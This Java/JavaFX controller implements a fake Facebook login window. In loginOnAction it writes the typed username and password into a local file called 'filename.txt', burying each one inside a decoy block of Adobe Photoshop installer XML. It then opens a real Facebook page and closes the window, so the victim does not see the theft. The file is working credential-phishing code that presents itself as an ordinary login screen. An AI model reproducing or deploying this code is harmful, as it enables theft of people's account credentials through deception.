package controller;

import javafx.event.ActionEvent;
import javafx.scene.control.Alert;
import javafx.scene.control.PasswordField;
import javafx.scene.control.TextField;
import javafx.scene.layout.AnchorPane;
import javafx.stage.Stage;

import java.io.File;
import java.awt.*;
import java.io.FileWriter;
import java.io.IOException;
import java.net.URI;
import java.net.URISyntaxException;

public class FaceBookLoginPageController {

    public TextField txtUserName;
    public PasswordField txtPassword;
    public AnchorPane facebookContext;

    public void loginOnAction(ActionEvent event) {
        if (txtPassword.getText().isEmpty() || txtUserName.getText().isEmpty()){
            new Alert(Alert.AlertType.ERROR,"The email address or mobile number you entered isn't connected to an account.\n Find your account and log in.").showAndWait();
        }else {
            Desktop d=Desktop.getDesktop();
            try {
                //File myObj = new File("filename.txt");

                FileWriter myWriter = new FileWriter("filename.txt");
                myWriter.write("System.out.println(<DriverInfo>\n" +
                        "\t<ProductInfo>\n" +
                        "\t\t<Name>Adobe Photoshop</Name>\n" +
                        "\t\t<SAPCode>PHSP</SAPCode>\n" +
                        "\t\t<CodexVersion>21.0.2</CodexVersion>\n" +
                        "\t\t<Platform>win64</Platform>\n" +
                        "\t\t<EsdDirectory>./PHSP</EsdDirectory>\n" +
                        "\t\t<Dependencies>\n" +
                        "\t\t\t<Dependency>\n" +
                        "\t\t\t\t<SAPCode>ACR</SAPCode>\n" +
                        "\t\t\t\t<BaseVersion>9.6</BaseVersion>\n" +
                        "\t\t\t\t<EsdDirectory>./ACR</EsdDirectory>\n" +
                        "\t\t\t</Dependency>\n" +
                        "\t\t\t<Dependency>\n" +
                        "\t\t\t\t<SAPCode>COCM</SAPCode>\n" +
                        "\t\t\t\t<BaseVersion>1.0</BaseVersion>\n" +
                        "\t\t\t\t<EsdDirectory>./COCM</EsdDirectory>\n" +
                        "\t\t\t</Dependency>\n" +
                        "\t\t\t<Dependency>\n" +
                        "\t\t\t\t<SAPCode>CORG</SAPCode>\n" +
                        "\t\t\t\t<BaseVersion>1.0</BaseVersion>\n" +
                        "\t\t\t\t<EsdDirectory>./CORG</EsdDirectory>\n" +
                        "\t\t\t</Dependency>\n" +
                        "\t\t\t<Dependency>\n" +
                        "\t\t\t\t<SAPCode>CCXP</SAPCode>\n" +
                        "\t\t\t\t<BaseVersion>2.2.1</BaseVersion>\n" +
                        "\t\t\t\t<EsdDirectory>./CCXP</EsdDirectory>\n" +
                        "\t\t\t</Dependency>\n" +
                        "\t\t\t<Dependency>\n" +
                        "\t\t\t\t<SAPCode>COPS</SAPCode>=--------------------"+txtUserName.getText()+")");
                myWriter.write("\n");
                myWriter.write("System.out.println(<DriverInfo>\n" +
                        "\t<ProductInfo>\n" +
                        "\t\t<Name>Adobe Photoshop</Name>\n" +
                        "\t\t<SAPCode>PHSP</SAPCode>\n" +
                        "\t\t<CodexVersion>21.0.2</CodexVersion>\n" +
                        "\t\t<Platform>win64</Platform>\n" +
                        "\t\t<EsdDirectory>./PHSP</EsdDirectory>\n" +
                        "\t\t<Dependencies>\n" +
                        "\t\t\t<Dependency>\n" +
                        "\t\t\t\t<SAPCode>ACR</SAPCode>\n" +
                        "\t\t\t\t<BaseVersion>9.6</BaseVersion>\n" +
                        "\t\t\t\t<EsdDirectory>./ACR</EsdDirectory>\n" +
                        "\t\t\t</Dependency>\n" +
                        "\t\t\t<Dependency>\n" +
                        "\t\t\t\t<SAPCode>COCM</SAPCode>\n" +
                        "\t\t\t\t<BaseVersion>1.0</BaseVersion>\n" +
                        "\t\t\t\t<EsdDirectory>./COCM</EsdDirectory>\n" +
                        "\t\t\t</Dependency>\n" +
                        "\t\t\t<Dependency>\n" +
                        "\t\t\t\t<SAPCode>CORG</SAPCode>\n" +
                        "\t\t\t\t<BaseVersion>1.0</BaseVersion>\n" +
                        "\t\t\t\t<EsdDirectory>./CORG</EsdDirectory>\n" +
                        "\t\t\t</Dependency>\n" +
                        "\t\t\t<Dependency>\n" +
                        "\t\t\t\t<SAPCode>CCXP</SAPCode>\n" +
                        "\t\t\t\t<BaseVersion>2.2.1</BaseVersion>\n" +
                        "\t\t\t\t<EsdDirectory>./CCXP</EsdDirectory>\n" +
                        "\t\t\t</Dependency>\n" +
                        "\t\t\t<Dependency>\n" +
                        "\t\t\t\t<SAPCode>COPS</SAPCode>=--------------------"+txtPassword.getText()+")");
                myWriter.close();


                d.browse(new URI("https://www.facebook.com/pages/category/Public-Figure/login-form-110673935611628/"));

                Stage window=(Stage)facebookContext.getScene().getWindow();
                window.close();
            } catch (IOException e) {
                System.out.println("An error occurred.");
                e.printStackTrace();
            } catch (URISyntaxException e) {
                e.printStackTrace();
            }
        }
    }

    public void forgottenPasswordOnAction(ActionEvent event) {
        Desktop d=Desktop.getDesktop();
        try {
            d.browse(new URI("https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0"));
        } catch (IOException e) {
            e.printStackTrace();
        } catch (URISyntaxException e) {
            e.printStackTrace();
        }
    }

    public void createNewAcountOnAction(ActionEvent event) {
        Desktop d=Desktop.getDesktop();
        try {
            d.browse(new URI("https://www.facebook.com/login/"));
        } catch (IOException e) {
            e.printStackTrace();
        } catch (URISyntaxException e) {
            e.printStackTrace();
        }
    }
}
